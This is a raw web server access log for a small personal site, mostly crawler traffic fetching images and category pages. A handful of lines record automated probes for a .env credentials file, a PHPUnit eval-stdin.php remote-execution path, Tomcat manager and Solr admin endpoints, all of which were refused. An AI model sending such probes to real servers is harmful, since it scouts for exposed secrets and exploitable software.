51.222.253.11 - - [27/Jun/2022:07:48:28 +0000] "GET /wp-content/uploads/2014/02/IMG_7781-1024x1024.jpg HTTP/2.0" 200 277011 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.3 - - [27/Jun/2022:07:48:31 +0000] "GET /wp-content/uploads/2014/02/IMG_7784-150x150.jpg HTTP/2.0" 200 26587 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.18 - - [27/Jun/2022:07:48:33 +0000] "GET /wp-content/uploads/2014/02/IMG_7781-150x150.jpg HTTP/2.0" 200 15366 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.11 - - [27/Jun/2022:07:48:35 +0000] "GET /wp-content/uploads/2014/02/IMG_7785-150x150.png HTTP/2.0" 200 6231 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.5 - - [27/Jun/2022:07:48:36 +0000] "GET /wp-content/uploads/2014/02/IMG_7778-150x150.jpg HTTP/2.0" 200 19142 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.11 - - [27/Jun/2022:07:48:38 +0000] "GET /wp-content/uploads/2014/02/IMG_7799-150x150.jpg HTTP/2.0" 200 13337 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.3 - - [27/Jun/2022:07:48:39 +0000] "GET /wp-content/uploads/2014/02/Photo-25-2-14-20-20-20-150x150.jpg HTTP/2.0" 200 13811 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.5 - - [27/Jun/2022:07:48:42 +0000] "GET /wp-content/uploads/2014/02/Photo-25-2-14-20-19-51-150x150.jpg HTTP/2.0" 200 14741 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.9 - - [27/Jun/2022:07:48:44 +0000] "GET /wp-content/uploads/2014/02/CH7_4256-copy-1024x682.jpg HTTP/2.0" 200 111939 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.8 - - [27/Jun/2022:07:48:46 +0000] "GET /wp-content/uploads/2014/02/IMG_7796-150x150.png HTTP/2.0" 200 6164 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.8 - - [27/Jun/2022:07:48:47 +0000] "GET /wp-content/uploads/2014/02/20140223-231214.jpg HTTP/2.0" 200 100110 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.3 - - [27/Jun/2022:07:48:51 +0000] "GET /wp-content/uploads/2014/02/IMG_7762-150x150.jpg HTTP/2.0" 200 13512 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.13 - - [27/Jun/2022:07:48:53 +0000] "GET /wp-content/uploads/2014/02/IMG_7774-150x150.jpg HTTP/2.0" 200 10948 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.4 - - [27/Jun/2022:07:48:55 +0000] "GET /wp-content/uploads/2014/02/IMG_7786-150x150.jpg HTTP/2.0" 200 24805 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.15 - - [27/Jun/2022:07:48:57 +0000] "GET /wp-content/uploads/2014/02/CH7_4264-1024x681.jpg HTTP/2.0" 200 113194 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.8 - - [27/Jun/2022:07:48:59 +0000] "GET /wp-content/uploads/2014/02/IMG_7786-1024x1024.jpg HTTP/2.0" 200 184268 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.1 - - [27/Jun/2022:07:49:01 +0000] "GET /wp-content/uploads/2014/02/IMG_7760-150x150.jpg HTTP/2.0" 200 10347 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.18 - - [27/Jun/2022:07:49:03 +0000] "GET /wp-content/uploads/2014/02/IMG_7791-768x1024.jpg HTTP/2.0" 200 164740 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.12 - - [27/Jun/2022:07:49:05 +0000] "GET /wp-content/uploads/2014/02/20140223-231221.jpg HTTP/2.0" 200 110352 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.20 - - [27/Jun/2022:07:49:07 +0000] "GET /wp-content/uploads/2014/02/IMG_7782-150x150.jpg HTTP/2.0" 200 27867 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.10 - - [27/Jun/2022:07:49:10 +0000] "GET /wp-content/uploads/2014/02/20140223-231235.jpg HTTP/2.0" 200 2077241 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.1 - - [27/Jun/2022:07:49:13 +0000] "GET /wp-content/uploads/2014/02/IMG_7793-1024x1024.jpg HTTP/2.0" 200 193485 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.9 - - [27/Jun/2022:07:49:15 +0000] "GET /wp-content/uploads/2014/02/IMG_7798-150x150.jpg HTTP/2.0" 200 26449 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.6 - - [27/Jun/2022:07:49:17 +0000] "GET /wp-content/uploads/2014/02/IMG_7797-150x150.png HTTP/2.0" 200 12289 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.5 - - [27/Jun/2022:07:49:17 +0000] "GET /node/179 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
51.222.253.9 - - [27/Jun/2022:07:49:18 +0000] "GET /wp-content/uploads/2014/02/IMG_7759-150x150.jpg HTTP/2.0" 200 27192 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.23 - - [27/Jun/2022:07:49:18 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
66.249.92.79 - - [27/Jun/2022:07:49:20 +0000] "GET /feed HTTP/1.1" 404 134 "-" "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)"
185.191.171.3 - - [27/Jun/2022:07:49:21 +0000] "GET /node/179 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.24 - - [27/Jun/2022:07:49:23 +0000] "GET /node/179/ HTTP/1.1" 200 10452 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
17.121.113.190 - - [27/Jun/2022:07:49:48 +0000] "GET /wp-content/uploads/2014/02/Screenshot-2014-02-06-23.34.14.png HTTP/1.1" 200 70213 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
51.222.253.19 - - [27/Jun/2022:07:50:44 +0000] "GET /photo-25-2-14-13-12-55/ HTTP/2.0" 200 7969 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.19 - - [27/Jun/2022:07:53:20 +0000] "GET /img_7545/ HTTP/2.0" 200 7867 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
207.46.13.174 - - [27/Jun/2022:07:55:59 +0000] "GET /wp-includes/js/comment-reply.min.js?ver=5.7.1 HTTP/2.0" 200 2984 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.114 - - [27/Jun/2022:07:55:59 +0000] "GET /wp-includes/js/wp-embed.min.js?ver=5.7.1 HTTP/2.0" 200 1426 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.174 - - [27/Jun/2022:07:56:02 +0000] "GET /wp-includes/js/wp-emoji-release.min.js?ver=5.7.1 HTTP/2.0" 200 14229 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
51.222.253.7 - - [27/Jun/2022:07:56:03 +0000] "GET /node/1120/img_6623/ HTTP/2.0" 200 7878 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [27/Jun/2022:07:57:03 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:07:57:03 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.20 - - [27/Jun/2022:07:58:49 +0000] "GET /ch7_3330/ HTTP/2.0" 200 7868 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.43 - - [27/Jun/2022:07:59:02 +0000] "GET /node/category/uncategorized/page/3 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.11 - - [27/Jun/2022:07:59:05 +0000] "GET /node/category/uncategorized/page/3/ HTTP/1.1" 200 13909 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
113.250.237.33 - - [27/Jun/2022:07:59:14 +0000] "GET / HTTP/1.1" 200 396 "http://www.mrchoke.org" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
185.191.171.14 - - [27/Jun/2022:08:00:28 +0000] "GET /node/865/ch7_3250 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.19 - - [27/Jun/2022:08:00:30 +0000] "GET /node/865/ch7_3250/ HTTP/1.1" 200 7892 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.40 - - [27/Jun/2022:08:00:31 +0000] "GET /node/category/weight HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.39 - - [27/Jun/2022:08:00:32 +0000] "GET /node/category/weight HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.14 - - [27/Jun/2022:08:00:34 +0000] "GET /node/category/weight/ HTTP/1.1" 200 7710 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.5 - - [27/Jun/2022:08:00:38 +0000] "GET /img_6974 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.15 - - [27/Jun/2022:08:00:41 +0000] "GET /img_6974/ HTTP/1.1" 200 7885 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
51.222.253.3 - - [27/Jun/2022:08:01:37 +0000] "GET /img_7680/ HTTP/2.0" 200 7874 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.7 - - [27/Jun/2022:08:01:40 +0000] "GET /wp-content/uploads/2014/02/IMG_7676-150x150.jpg HTTP/2.0" 200 18769 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.9 - - [27/Jun/2022:08:01:47 +0000] "GET /wp-content/uploads/2014/02/IMG_7681-150x150.jpg HTTP/2.0" 200 26197 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.19 - - [27/Jun/2022:08:01:50 +0000] "GET /wp-content/uploads/2014/02/IMG_7680.jpg HTTP/2.0" 200 3116233 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [27/Jun/2022:08:01:58 +0000] "GET /ch7_3416/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:08:02:03 +0000] "GET /ch7_3422/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:08:02:08 +0000] "GET /img_6756/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:08:02:12 +0000] "GET /node/21/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:08:03:33 +0000] "GET /node/790/img_6139/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:08:03:36 +0000] "GET /node/865/ch7_3158/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
192.241.212.154 - - [27/Jun/2022:08:04:00 +0000] "GET /manager/html HTTP/1.1" 400 264 "-" "Mozilla/5.0 zgrab/0.x"
51.222.253.17 - - [27/Jun/2022:08:04:22 +0000] "GET /img_7189/ HTTP/2.0" 200 7904 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [27/Jun/2022:08:04:45 +0000] "GET /node/5/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:08:05:12 +0000] "GET /node/835/img_6231 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:08:05:13 +0000] "GET /node/865/ch7_3226 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:08:05:31 +0000] "GET /wp-content/uploads/2014/01/CH7_3265.jpg HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.14 - - [27/Jun/2022:08:07:24 +0000] "GET /node/217/ HTTP/2.0" 200 8303 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.181 - - [27/Jun/2022:08:07:26 +0000] "GET /files/u1/sis6-installer-proto00001.jpg HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.13 - - [27/Jun/2022:08:10:02 +0000] "GET /node/category/opentle/ HTTP/2.0" 200 7407 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [27/Jun/2022:08:11:36 +0000] "GET /wp-content/uploads/2014/01/IMG_6364.jpg HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:08:12:17 +0000] "GET /wp-content/uploads/2014/02/Photo-18-2-14-15-39-46.png HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.6 - - [27/Jun/2022:08:12:56 +0000] "GET /node/category/iceweasel/ HTTP/2.0" 200 34294 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
94.247.172.129 - - [27/Jun/2022:08:14:54 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2)"
51.222.253.12 - - [27/Jun/2022:08:16:03 +0000] "GET /node/790/img_6133/ HTTP/2.0" 200 7898 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.14 - - [27/Jun/2022:08:19:08 +0000] "GET /node/1839/img_7957/ HTTP/2.0" 200 7868 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
62.197.136.68 - - [27/Jun/2022:08:20:45 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 134 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
51.222.253.17 - - [27/Jun/2022:08:21:54 +0000] "GET /node/category/linux/ HTTP/2.0" 200 15605 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [27/Jun/2022:08:22:14 +0000] "GET /node/323/?replytocom=354 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.14 - - [27/Jun/2022:08:25:13 +0000] "GET /node/1731/img_7752/ HTTP/2.0" 200 7886 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
66.249.66.22 - - [27/Jun/2022:08:26:26 +0000] "GET /node/113 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.22 - - [27/Jun/2022:08:26:27 +0000] "GET /node/113/ HTTP/1.1" 200 8599 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.22 - - [27/Jun/2022:08:26:29 +0000] "GET /wp-includes/js/comment-reply.min.js?ver=5.7.1 HTTP/1.1" 200 2984 "https://static.mrchoke.org/node/113/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
51.222.253.15 - - [27/Jun/2022:08:28:09 +0000] "GET /node/category/codefest/ HTTP/2.0" 200 8889 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.5 - - [27/Jun/2022:08:28:11 +0000] "GET /files/u1/loy-49-03.jpg HTTP/2.0" 200 24939 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.4 - - [27/Jun/2022:08:28:14 +0000] "GET /files/u1/loy-49-02.jpg HTTP/2.0" 200 37797 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.5 - - [27/Jun/2022:08:28:16 +0000] "GET /files/u1/loy-49-01.jpg HTTP/2.0" 200 43965 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.16 - - [27/Jun/2022:08:31:19 +0000] "GET /img_6578/ HTTP/2.0" 200 7868 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.2 - - [27/Jun/2022:08:34:45 +0000] "GET /node/224/ HTTP/2.0" 200 8557 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.7.214.104 - - [27/Jun/2022:08:36:08 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
217.197.136.89 - - [27/Jun/2022:08:36:27 +0000] "GET /wp-content/uploads/2013/12/virtualbox_logo.png HTTP/2.0" 302 154 "https://www.sitepoint.com/" "Mozilla/5.0 (Linux; Android 9; SM-J330F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
217.197.136.89 - - [27/Jun/2022:08:36:28 +0000] "GET /wp-content/uploads/2013/12/virtualbox_logo.png HTTP/2.0" 404 186 "https://www.sitepoint.com/" "Mozilla/5.0 (Linux; Android 9; SM-J330F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
51.222.253.7 - - [27/Jun/2022:08:38:13 +0000] "GET /img_6843/ HTTP/2.0" 200 7911 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.16 - - [27/Jun/2022:08:41:19 +0000] "GET /img_6579/ HTTP/2.0" 200 7871 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
128.14.133.58 - - [27/Jun/2022:08:43:57 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
51.222.253.16 - - [27/Jun/2022:08:44:21 +0000] "GET /node/category/webpage/ HTTP/2.0" 200 11715 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.149.84 - - [27/Jun/2022:08:44:24 +0000] "GET /files/u1/nectec-block.png HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.206 - - [27/Jun/2022:08:44:25 +0000] "GET /files/u1/darken-popup.png HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.18 - - [27/Jun/2022:08:47:24 +0000] "GET /node/date/2008/11/ HTTP/2.0" 200 8274 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.13 - - [27/Jun/2022:08:50:24 +0000] "GET /node/category/drupal/ HTTP/2.0" 200 17457 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.5 - - [27/Jun/2022:08:53:22 +0000] "GET /node/date/2007/05/ HTTP/2.0" 200 13293 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.7.214.104 - - [27/Jun/2022:08:54:03 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.222.253.11 - - [27/Jun/2022:08:56:30 +0000] "GET /node/date/2005/04/ HTTP/2.0" 200 10226 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
109.237.103.123 - - [27/Jun/2022:08:58:44 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [27/Jun/2022:08:58:44 +0000] "\x16\x03\x01\x01D\x01\x00\x01@\x03\x03\x8At\xA7\xC3\xCD\xF0\x1Dz7]\x9F\x1Ce/X\x07\x1B\x03\xE0\x05, \xC2\x103\x8E\x06\xE6\xB8\xE0I\xD4 '+\xA6\x93\xEC\xB3W{9w\xFBGf\x19\x81<|R\x9C\x15\xB8\xB1" 400 166 "-" "-"
51.222.253.15 - - [27/Jun/2022:08:59:27 +0000] "GET /node/date/2005/02/ HTTP/2.0" 200 11642 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
5.45.207.92 - - [27/Jun/2022:08:59:44 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
87.250.224.4 - - [27/Jun/2022:08:59:48 +0000] "GET /node/category/ifuse HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.45.207.72 - - [27/Jun/2022:08:59:50 +0000] "GET /node/category/ifuse HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
213.180.203.86 - - [27/Jun/2022:08:59:53 +0000] "GET /node/category/ifuse/ HTTP/1.1" 200 11523 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
216.244.66.229 - - [27/Jun/2022:09:00:46 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
185.21.216.169 - - [27/Jun/2022:09:02:45 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
51.222.253.19 - - [27/Jun/2022:09:02:52 +0000] "GET /node/category/nikon/ HTTP/2.0" 200 8134 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [27/Jun/2022:09:05:24 +0000] "GET /img_6746/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.12 - - [27/Jun/2022:09:06:28 +0000] "GET /node/category/windows/ HTTP/2.0" 200 8936 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [27/Jun/2022:09:08:07 +0000] "GET /node/22/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:09:08:59 +0000] "GET /feed/?attachment_id=1154 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:09:09:04 +0000] "GET /feed/?attachment_id=1206 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.11 - - [27/Jun/2022:09:09:39 +0000] "GET /node/date/2004/08/ HTTP/2.0" 200 10226 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
66.249.66.152 - - [27/Jun/2022:09:11:27 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.154 - - [27/Jun/2022:09:11:27 +0000] "GET /node/581 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.22 - - [27/Jun/2022:09:11:28 +0000] "GET /node/581 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.24 - - [27/Jun/2022:09:11:29 +0000] "GET /node/581/ HTTP/1.1" 200 9696 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
51.222.253.18 - - [27/Jun/2022:09:12:49 +0000] "GET /node/category/oss/ HTTP/2.0" 200 14608 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
49.36.189.86 - - [27/Jun/2022:09:13:40 +0000] "GET /wp-content/uploads/2013/12/virtualbox_logo.png HTTP/2.0" 302 154 "https://www.sitepoint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45"
